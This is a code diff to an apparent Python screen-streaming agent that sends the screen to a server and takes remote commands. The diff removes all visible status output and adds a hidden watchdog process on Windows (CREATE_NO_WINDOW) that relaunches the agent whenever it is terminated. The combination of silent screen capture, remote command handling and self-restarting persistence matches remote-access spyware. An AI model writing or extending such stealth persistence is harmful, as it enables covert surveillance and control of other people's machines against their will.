@@ -493,18 +493,62 @@ def stream_once():
             time.sleep(max(0.0, FRAME_INTERVAL - (time.time() - start)))
 
 
-def main():
-    print(f"connecting to {SERVER_URL} …")
+def _agent_main():
+    """Core agent loop: stream screen and handle remote commands."""
     while True:
         try:
             stream_once()
         except KeyboardInterrupt:
-            print("\nstopped.")
             return
-        except Exception as err:
-            print(f"disconnected ({err}). retrying in 3s…")
+        except Exception:
             time.sleep(3)
 
 
+# ── Watchdog / self-restart ────────────────────────────────────────
+
+def _spawn(extra_args):
+    """Spawn another instance of this process silently."""
+    if getattr(sys, "frozen", False):
+        cmd = [sys.argv[0]] + extra_args
+    else:
+        cmd = [sys.executable, sys.argv[0]] + extra_args
+    return subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW, close_fds=True)
+
+
+def _wait_pid(pid):
+    """Block until the given PID exits (Windows only)."""
+    kernel32 = ctypes.windll.kernel32
+    handle = kernel32.OpenProcess(0x00100000, False, pid)  # SYNCHRONIZE
+    if handle:
+        kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)   # INFINITE
+        kernel32.CloseHandle(handle)
+
+
+def _guard_loop():
+    """Guard process: if the main agent dies, restart it."""
+    try:
+        target_pid = int(sys.argv[sys.argv.index("--guard") + 1])
+    except (ValueError, IndexError):
+        return
+    while True:
+        _wait_pid(target_pid)
+        time.sleep(2)
+        try:
+            proc = _spawn(["--guarded"])
+            target_pid = proc.pid
+        except Exception:
+            time.sleep(5)
+
+
 if __name__ == "__main__":
-    main()
+    if "--guard" in sys.argv:
+        # Running as the silent watchdog
+        _guard_loop()
+    else:
+        if "--guarded" not in sys.argv:
+            # First launch: start the guard that will restart us if we die
+            try:
+                _spawn(["--guard", str(os.getpid())])
+            except Exception:
+                pass
+        _agent_main()
